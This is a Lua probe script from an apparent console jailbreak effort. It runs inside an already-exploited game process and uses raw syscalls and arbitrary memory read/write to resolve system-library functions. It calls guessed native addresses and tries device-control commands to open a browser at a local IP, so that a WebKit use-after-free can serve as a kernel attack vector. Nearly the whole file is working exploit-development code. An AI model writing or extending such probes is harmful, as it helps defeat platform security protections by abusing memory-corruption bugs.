-- CRASH_CLASS: MODERATE
-- PROBE p570: Attempt to launch web browser from game process
--
-- Context: The WebKit Canvas UAF is the only live kernel vector, but we need
-- browser access. Try Sony APIs to launch a browser from within the game.
-- libSceSystemService.sprx is loaded (handle 142). We'll try:
-- 1. dynlib_dlsym (sys 591) to resolve sceSystemServiceLaunchWebBrowser
-- 2. If dlsym fails (XO module), try brute-force calling known offsets
-- 3. Try sys 649 to get member addresses that might include browser launch

print("=== PROBE p570: Browser Launch from Game Process ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Get module info for libSceSystemService (handle 142)
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)

print("[A] Getting libSceSystemService info (handle 142)...")
local ret = pcall(function() sc_info(uint64(142), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_sz_lo = safe_rd(info + 0x110)
local text_sz_hi = safe_rd(info + 0x114)
print(string.format("  text base: 0x%X%08X  size: 0x%X%08X",
    text_hi or 0, text_lo or 0, text_sz_hi or 0, text_sz_lo or 0))

local sysserv_base = nil
if text_hi and text_lo then
    sysserv_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
    print("  base = " .. tostring(sysserv_base))
end

-- Try dynlib_dlsym (sys 591) to resolve browser functions
print("")
print("[B] Trying dynlib_dlsym (sys 591) for browser functions...")
local sc_dlsym = make_syscall(591)
local result_addr = memory.alloc(8)

-- Sony NID-encoded function names
-- sceSystemServiceLaunchWebBrowser NID varies by firmware
-- Try common patterns
local names_to_try = {
    "sceSystemServiceLaunchWebBrowser",
    "sceSystemServiceOpenUrl",
    "sceBrowserLaunch",
    "sceWebBrowserCreate",
}

for _, name in ipairs(names_to_try) do
    safe_wq(result_addr, uint64(0))
    local name_buf = memory.alloc(256)
    for i = 1, #name do
        safe_wd(name_buf + i - 1, string.byte(name, i))
    end
    safe_wd(name_buf + #name, 0)

    local ok, r = pcall(function()
        return sc_dlsym(uint64(142), uint64(name_buf), uint64(result_addr))
    end)
    local resolved = safe_rq(result_addr)
    local rh, rl = get_hi_lo(resolved)
    print(string.format("  dlsym('%s'): ok=%s ret=%s resolved=0x%X%08X",
        name, tostring(ok), tostring(r), rh, rl))
end

-- Try sys 649 to query member addresses for the SystemService module
print("")
print("[C] Querying sys 649 members for handle 142...")
local sc_649 = make_syscall(649)
local out649 = memory.alloc(0x100)

for member = 0, 10 do
    safe_wq(out649, uint64(0))
    safe_wq(out649 + 8, uint64(0))
    local ok, r = pcall(function()
        return sc_649(uint64(142), uint64(member), uint64(out649))
    end)
    local val = safe_rq(out649)
    local vh, vl = get_hi_lo(val)
    local rh, rl = get_hi_lo(r)
    if rh ~= 0xFFFFFFFF or rl ~= 0xFFFFFFFF then
        print(string.format("  member %d: ret=0x%X%08X val=0x%X%08X",
            member, rh, rl, vh, vl))
    end
end

-- Also try libSceWebBrowserDialog if it exists
print("")
print("[D] Checking for browser-related modules...")
local browser_handles = {143, 144, 145, 146, 147, 148, 149, 150}
for _, h in ipairs(browser_handles) do
    safe_wd(info, 0x160)
    local ok = pcall(function() sc_info(uint64(h), info) end)
    if ok then
        -- Read module name from info struct
        local name_offset = 0x10  -- name is near start of struct
        local name_bytes = {}
        for i = 0, 31 do
            local b = safe_rd(info + name_offset + i)
            if b and b > 0 and b < 128 then
                table.insert(name_bytes, string.char(b))
            else
                break
            end
        end
        local mname = table.concat(name_bytes)
        if #mname > 0 then
            print(string.format("  handle %d: name='%s'", h, mname))
        end
    end
end

-- Try calling sceSystemServiceLaunchWebBrowser via native.fcall_with_rax
-- The function should be at a known offset within libSceSystemService
-- On PS4, sceSystemServiceLaunchWebBrowser is typically exported
-- We can try calling it with a URL string
print("")
print("[E] Attempting browser launch via native.fcall_with_rax...")

if native and native.fcall_with_rax then
    -- Prepare URL string
    local url_str = "http://10.0.0.231/"
    local url_buf = memory.alloc(256)
    for i = 1, #url_str do
        safe_wd(url_buf + i - 1, string.byte(url_str, i))
    end
    safe_wd(url_buf + #url_str, 0)

    -- Try sys 649 member types that returned addresses
    -- From CLAUDE.md: member types 1-4, 7, 8 return addresses
    -- For libSceSystemService, member 1 should be init, member 7/8 might be useful
    for member = 1, 8 do
        safe_wq(out649, uint64(0))
        local ok, r = pcall(function()
            return sc_649(uint64(142), uint64(member), uint64(out649))
        end)
        local func_addr = safe_rq(out649)
        local fh, fl = get_hi_lo(func_addr)
        if fh > 0 and fh ~= 0xFFFFFFFF then
            print(string.format("  member %d addr: 0x%X%08X", member, fh, fl))
            -- Try calling it with URL as arg
            -- Be careful - only call if it looks like a valid code address
            if fh >= 0x8 and fh < 0xF0 then
                local call_ok, call_ret = pcall(function()
                    return native.fcall_with_rax(func_addr, url_buf)
                end)
                local crh, crl = 0, 0
                if call_ret then crh, crl = get_hi_lo(call_ret) end
                print(string.format("    call(url): ok=%s ret=0x%X%08X",
                    tostring(call_ok), crh, crl))
            end
        end
    end
else
    print("  native.fcall_with_rax not available")
end

-- Try using sceSystemServiceLaunchWebBrowser via IPMI
-- Sony uses IPMI (Inter-Process Message Interface) for cross-process calls
-- sys 622 is the device control multiplexer, might reach ShellUI
print("")
print("[F] Trying sys 622 browser command...")
local sc_622 = make_syscall(622)
local cmd_buf = memory.alloc(0x100)

-- Command 0x220 (arbitrary) with URL
local url_str2 = "http://10.0.0.231/\0"
local url_buf2 = memory.alloc(256)
for i = 1, #url_str2 do
    safe_wd(url_buf2 + i - 1, string.byte(url_str2, i))
end

-- Try a few command IDs that might trigger browser
for _, cmd in ipairs({0x220, 0x230, 0x240, 0x250}) do
    safe_wq(cmd_buf, uint64(0))
    local ok, r = pcall(function()
        return sc_622(uint64(cmd), uint64(0), uint64(cmd_buf), uint64(url_buf2), uint64(0x40), uint64(0))
    end)
    local rh, rl = get_hi_lo(r)
    print(string.format("  cmd 0x%X: ok=%s ret=0x%X%08X", cmd, tostring(ok), rh, rl))
end

print("")
print("=== PROBE p570 COMPLETE ===")
